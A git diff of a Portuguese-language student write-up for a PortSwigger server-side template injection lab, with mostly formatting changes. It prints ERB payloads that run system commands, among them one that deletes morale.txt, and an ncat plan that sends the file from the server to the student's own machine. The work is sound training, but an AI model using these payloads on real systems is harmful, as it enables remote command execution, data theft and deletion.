@@ -17,19 +17,19 @@ Os mecanismos de modelo são projetados para gerar páginas da web combinando mo
 * Envie um print da área de detalhes da conta após ter logado
 <img src="imagens/Imagem1.png">
 
-## Exercício 01 - Lab
+# Exercício 01 - Lab
 
 Link: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic  
 
-### 01 - Uma captura de tela completa com a mensagem de erro produzida pela aplicação quando um item está esgotado no estoque.
+## 01 - Uma captura de tela completa com a mensagem de erro produzida pela aplicação quando um item está esgotado no estoque.
 
 <img src="imagens/Imagem2.png">
 
-### 02 - Uma captura de tela completa como prova de que você consegue realizar operações simples ou multiplicar uma string (exemplo: 'FIAP' * 10). Exiba o seu payload na barra de endereços.
+## 02 - Uma captura de tela completa como prova de que você consegue realizar operações simples ou multiplicar uma string (exemplo: 'FIAP' * 10). Exiba o seu payload na barra de endereços.
 
 <img src="imagens/Imagem3.png">
 
-### 03 - Envie um print mostrando qual o hash MD5 do arquivo morale.txt.
+## 03 - Envie um print mostrando qual o hash MD5 do arquivo morale.txt.
 
 Comando Utilizado: 
 ```
@@ -38,17 +38,17 @@ Comando Utilizado:
 
 <img src="imagens/Imagem4.png">
 
-### 04 - Responda qual o tipo de arquivo é o morale.txt.
+## 04 - Responda qual o tipo de arquivo é o morale.txt.
 
 Comando Utilizado: 
 ```
 <%= system('file morale.txt') %>
 ```
-R: morale.txt é um arquivo openssl enc'd data with salted password
+__R: morale.txt é um arquivo openssl enc'd data with salted password__
 
-### 05 - Demonstre como você copiaria o arquivo morale.txt do servidor do lab. Também forneça prova de que este arquivo foi copiado na sua própria máquina demonstrando as saídas dos comandos file, ls e md5sum no seu próprio terminal.
+## 05 - Demonstre como você copiaria o arquivo morale.txt do servidor do lab. Também forneça prova de que este arquivo foi copiado na sua própria máquina demonstrando as saídas dos comandos file, ls e md5sum no seu próprio terminal.
 
-R: Para transferir o arquivo do servidor para a minha maquina local eu utilizaria o ncat. Basicamente abriria uma porta em modo listening no meu kali e na URL passaria o comando:
+__R: Para transferir o arquivo do servidor para a minha maquina local eu utilizaria o ncat. Basicamente abriria uma porta em modo listening no meu kali e na URL passaria o comando:__
 
 Kali:
 ```
@@ -62,9 +62,8 @@ ncat IP < morale.txt
 ````
 O comando ira se conectar com o Kali e enviará o arquivo morale.txt após conexão.
 
-## Prints
+### Prints
 
-  
 - md5sum
   <img src="imagens/Imagem4.png">
 - file
@@ -72,15 +71,18 @@ O comando ira se conectar com o Kali e enviará o arquivo morale.txt após conex
 - ls
   <img src="imagens/Imagem6.png">
 
+## 06 - Forneça o payload utilizado para completar o primeiro laboratório e a evidência que você conseguiu completá-lo.
 
-### 06 - Forneça o payload utilizado para completar o primeiro laboratório e a evidência que você conseguiu completá-lo.
+Comando Utilizado: 
 
+```
 <%= system(' rm morale.txt ') %>
+```
 
 <img src="imagens/Imagem7.png">
 
-### 07 - Em qual linguagem o sistema de template está sendo executado?
+## 07 - Em qual linguagem o sistema de template está sendo executado?
 
-R: Ele foi escrito em ruby
+__R: Ele foi escrito em RUBY__
 
 <img src="imagens/Imagem8.png">
